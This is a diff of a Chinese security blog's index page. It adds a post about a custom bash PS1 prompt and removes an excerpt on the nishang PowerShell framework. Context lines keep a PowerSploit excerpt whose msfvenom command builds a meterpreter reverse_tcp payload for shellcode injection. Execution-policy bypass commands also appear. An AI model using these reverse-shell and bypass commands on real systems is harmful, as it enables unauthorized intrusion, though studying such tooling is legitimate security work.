@@ -139,6 +139,39 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/05/15/PS1/">
+                烦躁的不行……,调了个好看的 PS1
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/PS1/">PS1</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 最近,各种事儿,烦躁的不行,以此发泄下乱七八糟的情绪,顺手分享给大家,坚信生活不只是单调,还有诗和远方:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cd </div><div class="line"># vi .bash_profile   把PS1换成下面的语句</div><div class="line">	PS1="<span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[35m<span class="symbol">\]</span><span class="symbol">\t</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> - <span class="symbol">\[</span><span class="symbol">\0</span>33[36m<span class="symbol">\]</span><span class="symbol">\u</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span>@<span class="symbol">\[</span><span class="symbol">\0</span>33[32m<span class="symbol">\]</span><span class="symbol">\h</span> :)<span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[33;1m<span class="symbol">\]</span><span class="symbol">\w</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> =&gt; "</div><div class="line"># source .bash_profile</div></pre></td></tr></table></figure>
+<p><img src="/img/PS1.png" alt=""><br>
+        </div>
+        <a href="/2017/05/15/PS1/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/04/30/GPU-HASH-CRACK/">
                 高速GPU hash破解工作站部署备忘
             </a>
@@ -577,38 +610,6 @@
 <p>0x02 命令执行类模块 [CodeExecution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-Shellcode.ps1 向指定进程中注入我们的shellcode,我们可以通过这种方式弹回一个meterpreter,注意shellcode系统位数版本要跟目标的系统一致才行,另外,权限务够也是必须的</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f powershell -o /root/Desktop/shell.txt</span></div><div class="line"><span class="comment"># msfconsole 监听刚才的payload配置</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2016/10/06/powersploit/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/10/05/nishang/">
-                powershell 渗透框架[ nishang ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-10-05</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/powershell/">powershell</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;注意,powershell只能针对win7以后的系统使用,此之前的win系统是没有引入powershell的,powershell是什么这里就不废话了,大家请自行谷歌,在使用各种powrshell脚本过程中,系统权限自然也是越高越好,权限越大你能在系统中操作的范围就越广,至于为什么要选择powershell,想必大家早已心知肚明,免杀,可直接跟系统api交互,容易定制,轻量,远程加载执行,对目标系统的影响极小……好处众多,这里就不多啰嗦了,说破天,我们最终的目的还是希望能在实际渗透中把它用起来,不然,实际价值何在呢</p>
-<p>0x02 关于nishang<br>&nbsp;&nbsp;&nbsp;&nbsp;今天我们就先来看看第一款powershell渗透框架<code>其实,个人觉得把它称为powershell渗透框架似乎更合适些</code>,<code>nishang</code> [想必现在早已家喻户晓],关于nishang中的各个ps脚本的选项用法,在其脚本代码的最前面都有详细说明,使用前请务必仔细阅读,因为系统默认是禁止执行ps脚本的,所以实际用的时候后面都会带上bypass选项<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted  如果你得到的是一个交互式的ps shell,也可以用该命令来放开脚本执行限制</div><div class="line"><span class="comment"># powershell –exec bypass –Command "Get-Host | Select-Object Version"  查看当前powershell版本,有些脚本只能在指定的powershell版本中执行</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/10/05/nishang/" class="read-more">Read More</a>
     
 
 </div>
